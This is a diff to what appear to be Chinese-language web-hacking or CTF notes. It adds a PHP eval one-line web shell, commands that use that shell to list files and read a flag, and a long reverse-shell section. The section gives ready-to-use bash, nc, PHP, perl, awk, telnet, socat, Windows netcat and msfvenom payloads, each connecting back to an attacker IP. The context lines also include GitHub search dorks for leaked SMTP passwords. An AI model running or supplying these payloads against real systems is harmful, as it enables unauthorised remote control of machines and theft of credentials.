@@ -114,10 +114,12 @@ JSP：jspx、jspf
    GIF89a
    
    <?php @eval($_POST[cmd]); ?>
+   如果有长度限制
+<?php eval($_GET[cmd]);
    ```
 
    
-
+   
 2. 
 
 <script language="php">@eval_r($_POST[cmd])</script>
@@ -185,6 +187,14 @@ php.ini是php的一个全局配置文件，对整个web服务起作用；而.use
 GIF89a 
 
 auto_prepend_file=b.gif //文件名为之前上传的一句话木马文件
+
+### 特殊情况
+
+会出现蚁剑连接后没有权限读取文件的情况，使用刚才上传的一句话木马进行文件读取
+
+print_r(scandir('.'));读取当前文件夹下的所有文件
+
+show_source('flag');读取flag
 
 ## 6.网站源码备份文件
 
@@ -600,6 +610,121 @@ header.payload.signature
 
 用法 ./jwtcrack <jwt>
 
+## 18.反弹shell
+
+### bash反弹shell
+
+```
+攻击者：nc -lvp 9999
+
+受害者：bash -i >& /dev/tcp/192.168.239.128/9999 0>&1
+```
+
+### nc反弹shell
+
+需要目标主机安装了nc
+
+```bash
+攻击者：nc -lvp 4566
+
+受害者：nc -e /bin/bash 192.168.239.128 4566
+```
+
+### php反弹
+
+首先最简单的一个办法，就是使用php的exec函数执行反弹shell
+（需要php关闭safe_mode选项，才可以使用exec函数）
+
+```
+攻击者：nc -nvlp 9875
+
+受害者：php -r 'exec("/usr/bin/bash -i >& /dev/tcp/192.168.239.128/9875 0>&1");'
+```
+
+一些变形
+
+```bash
+攻击者：nc -nvlp 4986
+
+php -r '$sock=fsockopen("192.168.239.128",4986);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
+
+### exec反弹
+
+```
+攻击者：nc -nvlp 5623
+
+受害者：0<&196;exec 196<>/dev/tcp/192.168.239.128/5623; sh <&196 >&196 2>&196
+```
+
+### perl反弹
+
+```
+攻击者：nc -nvlp 5623
+
+受害者：perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+### awk反弹
+
+```
+攻击者：nc -nvlp 5623
+
+受害者：awk 'BEGIN{s="/inet/tcp/0/192.168.99.242/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
+```
+
+### telnet反弹
+
+需要在攻击主机上分别监听4567和7654端口，执行反弹shell命令后，在4567终端输入命令，7654查看命令执行后的结果
+
+```
+攻击者：
+nc -nvlp 4567		#输入命令
+nc -nvlp 7654		#输出命令
+
+受害者：
+telnet 192.168.239.128 4567 | /bin/bash | telnet 192.168.239.128 7654
+```
+
+### socat反弹
+
+```
+攻击者：nc -nvlp 8989
+
+受害者：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.239.128:8989
+```
+
+### windows反弹shell
+
+#### nc反弹shell
+
+攻击者：
+nc -lvp 8989
+
+受害者：
+1：netcat 下载：https://eternallybored.org/misc/netcat/
+2：解压后的文件夹里面，按住shift键的同时，在文件夹的空白处鼠标右键打开一个命令窗口
+3：输入nc 192.168.239.128 8989 -e c:\windows\system32\cmd.exe
+
+#### MSF反弹
+
+使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们可能需要的payload
+
+```
+msfvenom -l payloads | grep 'cmd/windows/reverse'
+生成命令
+```
+
+```
+msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.40.146 LPORT=4444
+```
+
+
+然后MSF启动监听
+
+复制前面通过msfvenom生成的恶意代码到win7的cmd中执行即可。
+警告：有的文章说的是把那段恶意代码放到powershell中执行是不对的，也不能拿到session，至少我验证的结果是把代码放在cmd下执行才拿到session！
+
 #  2.SQL注入
 
 ## 1.过滤
@@ -909,3 +1034,4 @@ site:Github.com smtp @sina.com.cn
 site:Github.com smtp password 
 
 site:Github.com String password smtp
+
